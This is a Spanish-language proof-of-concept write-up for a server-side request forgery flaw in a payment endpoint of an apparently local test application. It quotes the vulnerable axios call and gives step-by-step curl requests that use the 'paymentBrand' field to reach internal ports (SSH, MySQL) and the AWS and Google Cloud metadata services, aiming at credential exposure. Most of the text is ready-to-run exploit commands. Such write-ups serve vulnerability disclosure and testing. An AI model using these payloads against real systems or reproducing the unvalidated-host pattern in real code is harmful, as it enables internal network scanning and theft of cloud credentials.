# Prueba de Concepto - Server Side Request Forgery (SSRF)

## Vulnerabilidad encontrada
El endpoint de procesamiento de pagos hace peticiones HTTP sin validación del host.

**Archivo vulnerable:** `services/backend/src/services/invoiceService.ts:65`
```typescript
const paymentResponse = await axios.post(`http://${paymentBrand}/payments`, {
  ccNumber,
  ccv,
  expirationDate
});
```

## Cómo explotar

### Paso 1: Obtener token de autenticación
```bash
curl -X POST http://localhost:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "password"}'
```

### Paso 2: Probar acceso a servicios internos
```bash
curl -X POST "http://localhost:5000/invoices/test-invoice/pay" \
  -H "Authorization: Bearer TU_TOKEN_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentBrand": "localhost:22",
    "ccNumber": "4111111111111111",
    "ccv": "123",
    "expirationDate": "12/25"
  }'
```

### Paso 3: Acceder a metadatos de AWS
```bash
curl -X POST "http://localhost:5000/invoices/test-invoice/pay" \
  -H "Authorization: Bearer TU_TOKEN_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentBrand": "169.254.169.254/latest/meta-data/",
    "ccNumber": "4111111111111111",
    "ccv": "123",
    "expirationDate": "12/25"
  }'
```

### Paso 4: Acceder a servicios de Google Cloud
```bash
curl -X POST "http://localhost:5000/invoices/test-invoice/pay" \
  -H "Authorization: Bearer TU_TOKEN_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentBrand": "metadata.google.internal/computeMetadata/v1/",
    "ccNumber": "4111111111111111",
    "ccv": "123",
    "expirationDate": "12/25"
  }'
```

### Paso 5: Escanear puertos internos
```bash
# Puerto SSH
curl -X POST "http://localhost:5000/invoices/test-invoice/pay" \
  -H "Authorization: Bearer TU_TOKEN_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentBrand": "localhost:22",
    "ccNumber": "4111111111111111",
    "ccv": "123",
    "expirationDate": "12/25"
  }'

# Puerto MySQL
curl -X POST "http://localhost:5000/invoices/test-invoice/pay" \
  -H "Authorization: Bearer TU_TOKEN_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentBrand": "localhost:3306",
    "ccNumber": "4111111111111111",
    "ccv": "123",
    "expirationDate": "12/25"
  }'
```

## Resultado esperado
- El servidor intenta conectarse a los hosts especificados
- Se pueden acceder a servicios internos no expuestos
- Se pueden extraer metadatos de servicios en la nube
- Se puede escanear la red interna

## Impacto
- Acceso a servicios internos no expuestos
- Extracción de metadatos de servicios en la nube
- Bypass de firewalls internos
- Escaneo de red interna
- Posible acceso a credenciales de servicios
